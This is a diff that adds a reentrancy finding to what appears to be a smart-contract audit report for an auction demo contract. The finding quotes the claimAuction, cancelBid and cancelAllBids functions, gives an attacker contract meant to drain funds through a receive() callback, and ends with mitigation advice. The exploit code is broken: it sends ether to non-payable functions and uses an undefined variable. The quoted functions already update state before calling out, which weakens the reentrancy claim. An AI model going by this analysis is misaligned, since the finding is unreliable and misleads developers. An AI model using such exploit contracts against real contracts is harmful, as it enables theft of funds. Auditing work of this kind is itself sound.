@@ -521,3 +521,95 @@ Checks-Effects-Interactions should be applied to the functions.
 Balance updates should be made at the beginning of the call.
 The actual call should be made at the end of the function.
 So that the balance is already updated first and reentrancy is not possible.
+## [L-10] Reentrancy in auction demo contract
+## Impact
+The reentrancy vulnerability uses the attack contract to call into the victim contract several times before the victim contract's balance updates.
+Hence allowing the attacker to withdraw e.g. 2 ether when they only deposited 1 ether.
+Which means double entry counting duplicate withdrawals for only one genuine withdrawal.
+## Proof of Concept
+**Vulnerable claimAuction function to reentrancy**
+```sol
+// Ln 104-120
+    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
+        require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
+        auctionClaim[_tokenid] = true;
+        uint256 highestBid = returnHighestBid(_tokenid);
+        address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
+        address highestBidder = returnHighestBidder(_tokenid);
+        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
+            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
+                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
+                (bool success, ) = payable(owner()).call{value: highestBid}("");
+                emit ClaimAuction(owner(), _tokenid, success, highestBid);
+            } else if (auctionInfoData[_tokenid][i].status == true) {
+                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
+                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
+            } else {}
+        }
+    }
+```
+**Vulnerable cancelBid function to reentrancy**
+```sol
+// Ln 124-130
+    function cancelBid(uint256 _tokenid, uint256 index) public {
+        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
+        require(auctionInfoData[_tokenid][index].bidder == msg.sender && auctionInfoData[_tokenid][index].status == true);
+        auctionInfoData[_tokenid][index].status = false;
+        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");
+        emit CancelBid(msg.sender, _tokenid, index, success, auctionInfoData[_tokenid][index].bid);
+    }
+```
+**Vulnerable cancelAllBids function to reentrancy**
+```sol
+// Ln 134-143
+    function cancelAllBids(uint256 _tokenid) public {
+        require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
+        for (uint256 i=0; i<auctionInfoData[_tokenid].length; i++) {
+            if (auctionInfoData[_tokenid][i].bidder == msg.sender && auctionInfoData[_tokenid][i].status == true) {
+                auctionInfoData[_tokenid][i].status = false;
+                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
+                emit CancelBid(msg.sender, _tokenid, i, success, auctionInfoData[_tokenid][i].bid);
+            } else {}
+        }
+    }
+```
+**Exploit Reentrancy**
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.19;
+
+import "./AuctionDemo.sol";
+
+contract tAuctionDemo {
+
+   AuctionDemo public x1;
+
+   constructor(AuctionDemo _x1) {
+
+      x1 = AuctionDemo(_x1);
+
+   }
+
+   function testReen() public payable {
+      x1.claimAuction{value: 2 ether}(uint256(24));
+      x1.cancelBid{value: 2 ether}(uint256(24), uint256(1));
+      x1.cancelAllBids{value: 2 ether}(uint256(24));
+   }
+   
+   receive() external payable {
+    
+      msg.sender.transfer(payable(address(_x1)).balance);
+
+   }
+
+   }
+```
+## Tools Used
+VS Code.
+## Recommended Mitigation Steps
+All functions that are not internal and are making a call should have a reentrancy guard added to them.
+Checks-Effects-Interactions should be applied to the functions. 
+Balance updates should be made at the beginning of the call.
+The actual call should be made at the end of the function.
+So that the balance is already updated first and reentrancy is not possible.
